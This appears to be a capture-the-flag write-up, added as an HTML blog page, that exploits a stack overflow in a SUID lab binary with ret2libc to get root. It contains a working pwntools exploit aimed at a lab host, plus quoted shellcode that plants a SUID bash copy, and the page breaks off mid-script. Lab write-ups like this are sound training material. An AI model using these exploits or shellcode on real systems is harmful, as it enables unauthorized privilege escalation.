@@ -1,0 +1,210 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="stylesheet" href="https://mvineza.github.io/spindel/assets/css/syntax.css"><link rel="preconnect" href="https://cdnjs.cloudflare.com"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><title> Bypass PIE (32-bit) - Ret2libc - Spindel</title><link rel="shortcut icon" href="https://mvineza.github.io/spindel/favicon.png"><link rel="alternate" type="application/atom+xml" title="Spindel" href="https://mvineza.github.io/spindel/atom.xml"><link rel="alternate" type="application/json" title="Spindel" href="https://mvineza.github.io/spindel/feed.json" /><link rel="sitemap" type="application/xml" title="sitemap" href="https://mvineza.github.io/spindel/sitemap.xml" /><style> *,:after,:before{box-sizing:border-box;background-color:inherit;color:inherit;margin:0;padding:0}html{font-size:17px}#theme-toggle{opacity:0.65;position:relative;border-radius:5px;height:25px;display:flex;-webkit-box-align:center;align-items:center;-webkit-box-pack:center;justify-content:center;transition:opacity 0.3s ease 0s;border:none;outline:none;background:none;cursor:pointer;padding:0px;appearance:none;transform:scale(0.8)}html,html[data-theme="light"]{--text-font: PT Sans;--source-code-font: Cousine;--very-light-text-color: rgb(222, 222, 222);--light-text-color: rgb(89, 183, 255);--medium-text-color: #555;--main-text-color: #333;--highlight-text-color: #6cb4a0;--dark-text-color: #393e46;--link-color: rgb(50, 87, 209);--code-bg-color: rgb(245, 245, 245);background-color:#fff}html #theme-toggle div,html[data-theme="light"] #theme-toggle div{position:relative;width:24px;height:24px;border-radius:50%;border:none;background-color:var(--theme-ui-colors-transparent, transparent);transform:scale(1);transition:all 0.45s ease 0s;overflow:hidden;box-shadow:inset 8px -8px 0px 0px var(--theme-ui-colors-toggleIcon, #2d3748)}html #theme-toggle div::before,html[data-theme="light"] #theme-toggle div::before{content:"";position:absolute;right:-9px;top:-9px;height:24px;width:24px;border:none;border-radius:50%;transform:translate(0px, 0px);opacity:1;transition:transform 0.45s ease 0s}html #theme-toggle div::after,html[data-theme="light"] #theme-toggle div::after{content:"";width:8px;height:8px;border-radius:50%;margin:-4px 0px 0px -4px;position:absolute;top:50%;left:50%;box-shadow:0 -23px 0 var(--theme-ui-colors-toggleIcon, #2d3748),0 23px 0 var(--theme-ui-colors-toggleIcon, #2d3748),23px 0 0 var(--theme-ui-colors-toggleIcon, #2d3748),-23px 0 0 var(--theme-ui-colors-toggleIcon, #2d3748),15px 15px 0 var(--theme-ui-colors-toggleIcon, #2d3748),-15px 15px 0 var(--theme-ui-colors-toggleIcon, #2d3748),15px -15px 0 var(--theme-ui-colors-toggleIcon, #2d3748),-15px -15px 0 var(--theme-ui-colors-toggleIcon, #2d3748);transform:scale(0);transition:all 0.35s ease 0s}html[data-theme="dark"]{--text-font: PT Sans;--source-code-font: Cousine;--very-light-text-color: #EEE;--light-text-color: #c4bbf0;--medium-text-color: #52057b;--main-text-color: #EAEAEA;--highlight-text-color: #6cb4a0;--dark-text-color: rgb(36, 38, 42);--link-color: rgb(255, 89, 125);--code-bg-color: rgb(36, 38, 42);background-color:#131418}html[data-theme="dark"] #theme-toggle div{position:relative;width:24px;height:24px;border-radius:50%;border:4px solid var(--theme-ui-colors-toggleIcon, #cbd5e0);background-color:var(--theme-ui-colors-toggleIcon, #cbd5e0);transform:scale(0.55);transition:all 0.45s ease 0s;overflow:visible;box-shadow:none}html[data-theme="dark"] #theme-toggle div::before{content:"";position:absolute;right:-9px;top:-9px;height:24px;width:24px;border:2px solid var(--theme-ui-colors-toggleIcon, #cbd5e0);border-radius:50%;transform:translate(14px, -14px);opacity:0;transition:transform 0.45s ease 0s}html[data-theme="dark"] #theme-toggle div::after{content:"";width:8px;height:8px;border-radius:50%;margin:-4px 0px 0px -4px;position:absolute;top:50%;left:50%;box-shadow:0 -23px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),0 23px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),23px 0 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),-23px 0 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),15px 15px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),-15px 15px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),15px -15px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0),-15px -15px 0 var(--theme-ui-colors-toggleIcon, #cbd5e0);transform:scale(1);transition:all 0.35s ease 0s}body{font-family:var(--text-font),"PT Sans",sans-serif;text-rendering:optimizeLegibility;line-height:1.75;color:var(--main-text-color)}a{color:var(--link-color);text-decoration:none}.post p{margin:1rem 0}.meta{margin:1.4rem 0}code,pre{background:var(--code-bg-color);margin:0 -27px;border-width:1px}code{font-family:var(--source-code-font),monospace;font-size:13px;margin:unset;padding:0.1rem;color:var(--highlight-text-color)}pre code{background-color:unset;color:unset;white-space:pre;overflow-x:scroll;overflow-y:hidden;display:block}pre{border-width:3px;padding:0.8rem;white-space:pre-wrap;border-style:none none none solid;border-color:var(--light-text-color)}img{max-width:100%}hr{background:var(--light-text-color);height:1px;border:0}header{flex-basis:10rem;flex-grow:1;position:relative}header a{text-decoration:none}header li{margin-bottom:0.2rem;text-align:right;margin-right:2rem}header a.active{font-weight:bold}header,section{padding:1rem 0}section{margin-top:5.5rem}blockquote{font-style:italic;border-left:5px solid var(--dark-text-color);padding-left:1rem}h1{color:var(--main-text-color);text-transform:uppercase;font-size:2rem;font-weight:bold;margin-bottom:1.0rem;margin-top:1.0rem}h2,h3,h4,h5{font-weight:bold;margin-bottom:1.5rem;font-size:2rem}h2{font-size:1.8rem;margin-top:1.0rem;margin-bottom:1.0rem}h3{font-size:1.6rem}h4{font-size:1.4rem}h5{font-size:1.2rem}h6{font-size:1rem}section h1:first-child{margin-top:0}strong,b{font-weight:bold}.photos ul{list-style:none}.photos li{margin-bottom:1.5rem}.photo picture,.project picture{margin-bottom:0.5rem}.posts>h3{font-weight:500}.post ul{margin:0px;margin:0px 0px 10px 10px}.post ol{margin:0px;margin:0px 0px 10px 15px}.posts li{align-items:center;display:flex;justify-content:space-between;margin-bottom:0.5rem}.posts li a,.posts li div,.projects li a{white-space:nowrap;overflow:hidden;text-overflow:ellipsis;font-weight:bold}.posts li time,.projects li time{padding-left:1rem;white-space:nowrap;font-variant-numeric:tabular-nums}time{color:var(--main-text-color)}.post>h1.title{font-size:x-large;margin-top:0;margin-bottom:0}.post>time{margin-bottom:0;margin-top:3rem}.highlight{margin:0px}main{display:flex;max-width:47rem;margin:-5rem auto 0;padding:2.4rem 2rem;flex-direction:column}.flex-row-between{display:flex;flex-direction:row;justify-content:space-between}.social-footer{padding:1rem;display:flex;justify-content:center;position:initial}.social-footer .social-footer-icons .fa{font-size:1.3rem;color:#a9a9a9}.social-footer .social-footer-icons .fa:hover{color:dimgray;transition:color 0.3s ease-in}@media screen and (max-width: 45rem){header li{display:inline;margin-right:1rem}.logo{padding-bottom:1rem}header ul{border-bottom:1px solid #edf2f7;padding-bottom:2rem}nav ul{border-right:0px}.photos ul{margin-top:0.5rem}main{padding:0 2rem}}section{flex-grow:999;display:flex;flex-direction:column}figcaption{font-size:smaller}.bio{margin-bottom:5rem}::selection{background-color:#fffba0;color:#333}.search-article{position:relative}.search-article label[for="search-input"]{position:relative;top:-10px;left:11px}.search-article input[type="search"]{top:-1rem;left:0;border:0;width:100%;height:30px;outline:none;position:absolute;border-radius:5px;padding:10px 10px 10px 35px;color:var(--main-text-color);-webkit-appearance:none;background-color:rgba(128,128,128,0.1);border:1px solid rgba(128,128,128,0.1)}.search-article input[type="search"]::-webkit-input-placeholder{color:#808080}.search-article input[type="search"]::-webkit-search-decoration,.search-article input[type="search"]::-webkit-search-results-decoration{display:none}#search-results{text-align:center}#search-results li{text-align:center}#search-results li::before{content:"›";display:inline-block;margin-left:-1.3em;width:1.3em;color:var(--main-text-color)}.post-nav{display:flex;position:relative;margin-top:0;border-top:2px solid var(--light-text-color);line-height:1.4}.post-nav .post-nav-item{border-bottom:0;padding-bottom:10px;width:50%;padding-top:10px;text-decoration:none;box-sizing:border-box}.post-nav .post-nav-item .post-title{color:var(--main-text-color)}.post-nav .post-nav-item:hover .post-title,.post-nav .post-nav-item:focus .post-title{color:var(--link-color);opacity:0.9}.post-nav .post-nav-item .nav-arrow{font-size:17px;color:var(--main-text-color);margin-bottom:3px;font-weight:bold}.post-nav .post-nav-item:nth-child(odd){padding-left:0;padding-right:20px}.post-nav .post-nav-item:nth-child(even){text-align:right;padding-right:0;padding-left:20px}.tags ul{list-style:none;display:grid;grid-template-columns:auto auto auto auto auto auto;grid-template-rows:auto auto auto auto}.tags li{white-space:normal;text-overflow:ellipsis}.timeline{position:center;width:650px;margin:-6em auto;padding:1px;list-style-type:none}@media (max-width: 860px){.timeline{width:100%}}.timeline:before{position:absolute;left:50%;top:0;content:' ';display:block;width:6px;height:170%;margin-left:-3px;background:var(--light-text-color);z-index:5}@media (max-width: 375px){.timeline:before{height:150%}}.timeline li{padding:2em 0}@media (max-width: 860px){.timeline li{padding:2em 0}}.timeline li::after{content:"";display:block;clear:both;visibility:hidden}.direction-l{position:relative;width:287px;float:left;text-align:right}@media (max-width: 860px){.direction-l{float:none;width:100%;text-align:center}}.direction-l .flag{color:#333;box-shadow:-1px 1px 1px rgba(0,0,0,0.52)}.direction-l .flag:after{content:"";position:absolute;left:100%;top:50%;height:0;width:0;margin-top:-8px;border:solid transparent;border-left-color:#f8f8f8;border-width:8px;pointer-events:none}@media (max-width: 860px){.direction-l .flag:after{content:"";position:absolute;left:50%;top:-8px;height:0;width:0;margin-left:-8px;border:solid transparent;border-bottom-color:#fff;border-width:8px;pointer-events:none}}.direction-l .time-wrapper{float:left}@media (max-width: 860px){.direction-l .time-wrapper{float:none}}.direction-r{position:relative;width:293px;float:right;text-align:left}@media (max-width: 860px){.direction-r{float:none;width:100%;text-align:center}}.direction-r .flag{color:#333;box-shadow:1px 1px 1px rgba(0,0,0,0.52)}.direction-r .flag:after{content:"";position:absolute;right:100%;top:50%;height:0;width:0;margin-top:-8px;border:solid transparent;border-right-color:#f8f8f8;border-width:8px;pointer-events:none}@media (max-width: 860px){.direction-r .flag:after{content:"";position:absolute;left:50%;top:-8px;height:0;width:0;margin-left:-8px;border:solid transparent;border-bottom-color:#fff;border-width:8px;pointer-events:none}}.direction-r .flag:before{left:-45px}.direction-r .time-wrapper{float:right}@media (max-width: 860px){.direction-r .time-wrapper{float:none}}.flag-wrapper{position:relative;display:inline-block;text-align:center}@media (max-width: 860px){.flag-wrapper{text-align:center}}.flag-wrapper .flag{position:relative;display:inline;background:#f8f8f8;padding:6px 10px;border-radius:5px;font-weight:600;text-align:left}@media (max-width: 860px){.flag-wrapper .flag{background:#fff;z-index:15}}.direction-l .flag:before,.direction-r .flag:before{position:absolute;top:60%;right:-40px;content:' ';display:block;width:12px;height:12px;margin-top:-10px;background:#fff;border-radius:10px;border:4px solid var(--link-color);z-index:10}@media (max-width: 860px){.direction-l .flag:before,.direction-r .flag:before{position:absolute;top:-30px;left:53%;content:' ';display:block;margin-left:-10px}}.time-wrapper{display:inline;line-height:1em;font-size:0.66666em;color:var(--link-color);vertical-align:middle}@media (max-width: 860px){.time-wrapper{display:block;position:relative;margin:4px 0 0 0;z-index:14}}.time-wrapper .time{display:inline-block;padding:4px 6px;background:#f8f8f8}.desc{margin:1em 0.2em -3.5em 0;font-size:0.9em;line-height:1.5em}.desc a{color:var(--link-color);text-decoration:none}.desc a:hover{text-decoration:underline}@media (max-width: 860px){.desc{position:relative;margin:1em 1em 0 1em;padding:1em;background:var(--code-bg-color);box-shadow:0 0 1px rgba(0,0,0,0.2);z-index:15}}</style></head><script async src="https://www.googletagmanager.com/gtag/js?id=G-3EP7KLCYVP"></script> <script> window.dataLayer = window.dataLayer || []; function gtag() { dataLayer.push(arguments); } gtag('js', new Date()); gtag('config', 'G-3EP7KLCYVP'); </script><body><main><section class="post"><div class="flex-row-between"> <a href="https://mvineza.github.io/spindel/">« back</a> <button title="Change theme" id="theme-toggle" onclick="modeSwitcher()"><div></div></button></div><time datetime="2022-04-03T00:00:00+08:00">Apr 3, 2022 - 3 ' read</time><h1 class="title"> Bypass PIE (32-bit) - Ret2libc</h1><span class="meta"> <a href="https://mvineza.github.io/spindel/tag/bof">bof</a>, <a href="https://mvineza.github.io/spindel/tag/linux">linux</a>, <a href="https://mvineza.github.io/spindel/tag/privesc">privesc</a></span><h2 id="overview"> Overview <a href="#overview">#</a></h2><p>If most stack protections are disabled except for PIE, attacker can leverage ret2libc method to do privilege escalation.</p><h2 id="environment-setup-and-requirements"> Environment Setup and Requirements <a href="#environment-setup-and-requirements">#</a></h2><ul><li>SUID binary inside victim machine</li></ul><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-rwsr-xr-x</span> 1 root root 12152 Sep  8  2017 /bin/lcars
+</code></pre></div></div><ul><li>PIE is enabled on binary</li><li>ASLR is disabled on victim machine</li><li>DEP or NX bit is not set on binary</li><li><code class="language-plaintext highlighter-rouge">gdb</code> present on victim machine</li><li><code class="language-plaintext highlighter-rouge">pwn</code> tools will be used by attacker</li><li>Ghidra will be used</li></ul><h2 id="steps"> Steps <a href="#steps">#</a></h2><p>Verify stack protections.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># victim machine - ASLR is off</span>
+www-data@enterprise:/dev/shm<span class="nv">$ </span><span class="nb">cat</span> /proc/sys/kernel/randomize_va_space 
+0
+www-data@enterprise:/dev/shm<span class="nv">$ </span>
+
+<span class="c"># attacker machine (get copy of binary) - only PIE is enabled</span>
+➜  lcars checksec ./lcars
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      PIE enabled
+    RWX:      Has RWX segments
+➜  lcars 
+</code></pre></div></div><p>.Try running binary and find the access code. Do this inside victim machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ltrace lcars
+<span class="c"># [...redacted...]</span>
+strcmp<span class="o">(</span><span class="s2">"asas</span><span class="se">\n</span><span class="s2">"</span>, <span class="s2">"picarda1"</span><span class="o">)</span>
+<span class="c"># [...redacted...]</span>
+
+<span class="c"># access code is picarda1</span>
+</code></pre></div></div><p>Now that we have the access code, let’s try to fuzz the binary and see where it SEGFAULT.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@enterprise:/dev/shm<span class="nv">$ </span>lcars
+
+                 _______ _______  ______ _______
+          |      |       |_____| |_____/ |______
+          |_____ |_____  |     | |    <span class="se">\_</span> ______|
+
+Welcome to the Library Computer Access and Retrieval System
+
+Enter Bridge Access Code: 
+picarda1
+
+                 _______ _______  ______ _______
+          |      |       |_____| |_____/ |______
+          |_____ |_____  |     | |    <span class="se">\_</span> ______|
+
+Welcome to the Library Computer Access and Retrieval System
+
+
+
+LCARS Bridge Secondary Controls <span class="nt">--</span> Main Menu: 
+
+1. Navigation
+2. Ships Log
+3. Science
+4. Security
+5. StellaCartography
+6. Engineering
+7. Exit
+Waiting <span class="k">for </span>input: 
+4
+Disable Security Force Fields
+Enter Security Override:
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+<span class="o">[</span>4]    111288 segmentation fault  ./lcars
+www-data@enterprise:/dev/shm<span class="nv">$ </span>
+
+<span class="c"># We can see here that it segfaulted at option 4, security.</span>
+</code></pre></div></div><p>Since gdb is available inside victim machine, let’s inspect the internals.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x00000508  _init
+0x00000540  strcmp@plt
+0x00000550  setresuid@plt
+0x00000560  <span class="nb">printf</span>@plt
+0x00000570  fflush@plt
+0x00000580  fgets@plt
+0x00000590  puts@plt
+0x000005a0  <span class="nb">exit</span>@plt
+0x000005b0  __libc_start_main@plt
+0x000005c0  __isoc99_scanf@plt
+0x000005e0  _start
+0x00000620  __x86.get_pc_thunk.bx
+0x00000630  deregister_tm_clones
+0x00000670  register_tm_clones
+0x000006c0  __do_global_dtors_aux
+0x00000710  frame_dummy
+0x0000074c  __x86.get_pc_thunk.dx
+0x00000750  startScreen
+0x000007d4  disableForcefields
+0x0000085e  main_menu
+0x00000b6a  unable
+0x00000ba8  bridgeAuth
+0x00000c91  main
+0x00000d30  __libc_csu_init
+0x00000d90  __libc_csu_fini
+0x00000d94  _fini
+<span class="o">(</span>gdb<span class="o">)</span> 
+</code></pre></div></div><p>There is some functions, but its quite hard to follow.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">(</span>gdb<span class="o">)</span> disas main_menu
+Dump of assembler code <span class="k">for function </span>main_menu:
+   0x0000085e &lt;+0&gt;:	push   ebp
+   0x0000085f &lt;+1&gt;:	mov    ebp,esp
+   0x00000861 &lt;+3&gt;:	push   ebx
+   0x00000862 &lt;+4&gt;:	sub    esp,0x1a4
+   0x00000868 &lt;+10&gt;:	call   0x620 &lt;__x86.get_pc_thunk.bx&gt;
+   0x0000086d &lt;+15&gt;:	add    ebx,0x2793
+   0x00000873 &lt;+21&gt;:	mov    DWORD PTR <span class="o">[</span>ebp-0xd4],0x0
+   0x0000087d &lt;+31&gt;:	call   0x750 &lt;startScreen&gt;
+   0x00000882 &lt;+36&gt;:	sub    esp,0xc
+   0x00000885 &lt;+39&gt;:	lea    eax,[ebx-0x2113]
+   0x0000088b &lt;+45&gt;:	push   eax
+   0x0000088c &lt;+46&gt;:	call   0x590 &lt;puts@plt&gt;
+<span class="c"># [...redacted...]</span>
+   0x00000b69 &lt;+779&gt;:	ret    
+End of assembler dump.
+<span class="o">(</span>gdb<span class="o">)</span> 
+</code></pre></div></div><p>So let’s grab a copy and analyze the binary in Ghidra inside our attacker machine.</p><p><img src="/spindel/assets/Bypass%20PIE%20(32-bit)%20-%20Ret2libc/31E67999-8DDB-47C7-9AD0-B5C729F144BA.png" alt="" /></p><p><img src="/spindel/assets/Bypass%20PIE%20(32-bit)%20-%20Ret2libc/924381DF-578B-4D2C-94FE-66D0689075C4.png" alt="" /></p><p>There are multiple <code class="language-plaintext highlighter-rouge">scaf</code> invocations. These functions are dangerous since it doesn’t have limit on how much buffer the user can put. We are interested in option 4 since that is where the SEGFAULT happened.</p><p>In Ghidra, it looks like its not calling a function,</p><p><img src="/spindel/assets/Bypass%20PIE%20(32-bit)%20-%20Ret2libc/25666F20-6A4E-4650-B4E9-173E6F75A5C5.png" alt="" /></p><p>But based from <a href="https://0xdf.gitlab.io/2021/06/16/htb-enterprise.html#static-analysis">0xdf</a>, its calling <code class="language-plaintext highlighter-rouge">disableForcefields</code>. Not sure why Ghidra is showing us that way but when I checked <code class="language-plaintext highlighter-rouge">disableForcefields</code>, it has same exact lines on what Ghidra showed us under <code class="language-plaintext highlighter-rouge">case 4:</code>.</p><p><img src="/spindel/assets/Bypass%20PIE%20(32-bit)%20-%20Ret2libc/B3207A83-BCD7-46B8-BAF8-67C49C51CC36.png" alt="" /></p><p>While investigating on this, I also tried to look for <code class="language-plaintext highlighter-rouge">function_addr_table</code> as 0xdf mentioned but I didnt saw it anywhere from my Ghidra output.</p><p><img src="/spindel/assets/Bypass%20PIE%20(32-bit)%20-%20Ret2libc/56A5AC4B-D1AD-4622-82A3-ADBF6919B975.png" alt="" /></p><p>The <code class="language-plaintext highlighter-rouge">scanf</code> is accepting only a buffer size of 204. This means beyond that, we can initiate the overflow.</p><p>Moving along, since we have now a better look in whats the binary is doing inside, we can now proceed on finding the offset and constructing our payload. Do this inside attacker machine.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># outside gdb</span>
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb <span class="nt">-l</span> 250
+
+<span class="c"># inside gdb</span>
+<span class="c"># [...redacted...]</span>
+Disable Security Force Fields
+Enter Security Override:
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2A
+
+Program received signal SIGSEGV, Segmentation fault.
+0x31684130 <span class="k">in</span> ?? <span class="o">()</span>
+
+<span class="c"># outside gdb again</span>
+➜  enterprise /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb <span class="nt">-q</span> 0x31684130          
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exact match at offset 212
+➜  enterprise 
+
+<span class="c"># EIP offset is 212</span>
+</code></pre></div></div><p>Since the PIE is enabled, meaning the program code region addresses will change, we will use ret2libc method to make it easier. Our payload format would be:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nop + system_addr + exit_addr + binsh_addr
+</code></pre></div></div><p>Let’s go back to victim machine and find the addresses using gdb.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Initialize binary</span>
+<span class="o">(</span>gdb<span class="o">)</span> b <span class="k">*</span>main
+Breakpoint 1 at 0xc91
+<span class="o">(</span>gdb<span class="o">)</span> run
+
+<span class="c"># Find system</span>
+<span class="o">(</span>gdb<span class="o">)</span> p system
+<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xf7e4c060 &lt;system&gt;
+
+<span class="c"># Find exit</span>
+<span class="o">(</span>gdb<span class="o">)</span> p <span class="nb">exit</span>  
+<span class="nv">$2</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xf7e3faf0 &lt;<span class="nb">exit</span><span class="o">&gt;</span>
+
+<span class="c"># Find /bin/sh</span>
+<span class="c"># NOTE: This is part is critical, there are a lot of options</span>
+<span class="c">#       but we need to carefully choose what to use. Since our</span>
+<span class="c">#       program accepts accepts a string input and a newline,</span>
+<span class="c">#       0x0a, we need to avoid 0x0a to prevent from breaking</span>
+<span class="c">#       the payload. We can choose all others except</span>
+<span class="c">#       0xf7f70a14. In this example, i will just choose the</span>
+<span class="c">#       first one which is 0xf7f6ddd5.</span>
+<span class="o">(</span>gdb<span class="o">)</span> find &amp;system,+9999999, <span class="s2">"sh"</span>                                  
+0xf7f6ddd5
+0xf7f6e7e1
+0xf7f70a14
+0xf7f72582
+warning: Unable to access 16000 bytes of target memory at 0xf7fc8485, halting search.
+4 patterns found.
+</code></pre></div></div><p>The lcars service is reachable from attacker machine, so we will use pwn tools to generate our exploit.</p><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1"># eip offset = 212
+</span>
+<span class="n">system</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xf7e4c060</span><span class="p">)</span>
+<span class="nb">exit</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xf7e3faf0</span><span class="p">)</span>
+<span class="n">binsh</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xf7f72582</span><span class="p">)</span>
+
+<span class="n">path</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">212</span> <span class="o">+</span> <span class="n">system</span> <span class="o">+</span> <span class="nb">exit</span> <span class="o">+</span> <span class="n">binsh</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"10.10.10.61"</span><span class="p">,</span> <span class="mi">32812</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Enter Bridge Access Code:"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"picarda1"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Waiting for input:"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"4"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Enter Security Override:"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div><p>Launchine it immediately gives us a shell as root.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  lcars ./bof.py
+<span class="c"># [...redacted...]</span>
+
+<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+<span class="nv">$ </span><span class="nb">wc</span> <span class="nt">-c</span> /root/root.txt
+33 /root/root.txt
+<span class="nv">$ </span> 
+</code></pre></div></div><h2 id="alternatives"> Alternatives <a href="#alternatives">#</a></h2><p>HTB official walkthrough do this exploitation in another way. It didn’t use re2libc but It made use of environment variables and classic linux buffer overflow exploit sandwich:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nop + shellcode + return_addr
+</code></pre></div></div><p>Then it runs the python script and redirect the output to a file. From there, the actual exploitation is quite odd to me:</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>payload.txt | <span class="nb">env</span> - /bin/lcars
+</code></pre></div></div><p>It also asked to do the following commands before exploitation.</p><div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">unset env </span>LINES 
+<span class="nb">unset env </span>COLUMNS
+</code></pre></div></div><p>Here is the full python script.</p><div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">struct</span>
+ <span class="c1"># The below shellcode will copy /bin/bash to /tmp/writeup and chmod 4777 it
+</span> <span class="c1"># Executing it with /tmp/writeup -p will grant a root shell
+</span> <span class="n">shellcode</span> <span class="o">=</span>  <span class="s">""</span>
+ <span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xd9\xee\xbd\x8f\x1f\x9f\xe9\xd9\x74\x24\xf4\x5f\x29</span><span class="s">"</span>
+ <span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xc9\xb1\x16\x83\xef\xfc\x31\x6f\x15\x03\x6f\x15\x6d</span><span class="s">"</span>
+ <span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xea\xf5\xe2\x29\x8c\x58\x93\xa1\x83\x3f\xd2\xd6\xb4</span><span class="s">"</span>
+ <span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x90\x97\x70\x45\x87\x78\xe2\x2c\x39\x0e\x01\xfc\x2d</span><span class="s">"</span>
+ <span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x23\xc5\x01\xae\x27\xb5\x21\x81\xc5\x5c\x4c\xf2\x6b</span><span class="s">"</span>
+ <span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xff\xe3\x64\x4c\xd0\x77\x18\xfc\x01\x0f\x90\x95\x29</span><span class="s">"</span>
+ <span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x8a\x21\x16\xea\x74\xa9\xbe\x61\x1a\x49\x1f\x4d\xd3</span><span class="s">"</span>
+ <span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xa6\x68\x8d\x34\xbd\xfb\xbd\x65\x4a\x76\x54\x0e\xd1</span><span class="s">"</span>
+ <span class="n">shellcode</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x03\xd6\xee\x4e\xbf\x9f\x0e\xbd\xbf</span><span class="s">"</span>
+<span class="n">addr</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="n">pack</span><span class="p">(</span><span class="s">'&lt;L'</span><span class="p">,</span> <span class="mh">0xffffdd60</span><span class="p">)</span>
+<span class="n">padding</span> <span class="o">=</span> <span class="mi">212</span>
+<span class="n">nops</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">70</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"picarda1</span><span class="se">\n</span><span class="s">4</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">nops</span>
